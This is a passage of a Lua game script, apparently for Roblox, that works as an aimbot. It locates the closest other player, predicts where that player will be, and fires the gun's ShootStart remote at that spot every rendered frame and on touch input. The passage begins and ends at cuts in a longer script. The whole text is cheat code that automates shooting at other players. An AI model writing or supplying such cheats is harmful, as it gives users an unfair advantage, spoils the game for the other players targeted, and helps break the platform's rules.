    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
            if humanoidRootPart then
                local distance = (localHumanoidRootPart.Position - humanoidRootPart.Position).Magnitude
                if distance < shortestDistance then
                    shortestDistance = distance
                    closestPlayer = player
                end
            end
        end
    end
    return closestPlayer and closestPlayer.Character, shortestDistance
end

local function shootAtClosestPlayer()
    if isScriptActive then
        local closestCharacter, distanceToClosestPlayer = getClosestPlayer()
        if closestCharacter then
            local predictedPosition = predictPosition(closestCharacter, distanceToClosestPlayer)
            if predictedPosition then
                local gun = LocalPlayer.Character:FindFirstChild("Gun")
                if gun and gun:FindFirstChild("GunServer") and gun.GunServer:FindFirstChild("ShootStart") then
                    local args = {
                        [1] = 1,
                        [2] = predictedPosition
                    }
                    gun.GunServer.ShootStart:FireServer(unpack(args))
                end
            end
        end
    end
end

RunService.RenderStepped:Connect(function()
    if isSharpShooterActive and isScriptActive then
        shootAtClosestPlayer()
    end
end)

UserInputService.TouchEnded:Connect(function(input)
    if initialTouchPosition then
        local finalTouchPosition = input.Position
        local movement = (finalTouchPosition - initialTouchPosition).Magnitude
        if movement < moveThreshold then
            local currentTime = tick()
            if currentTime - lastFireTime >= debounceTime then
                lastFireTime = currentTime
                shootAtClosestPlayer()
            end
        end
    end
end)

UserInputService.TouchStarted:Connect(function(input)
    initialTouchPosition = input.Position
end)

local function toggleScript()
    isScriptActive = not isScriptActive
end

else
    return
end
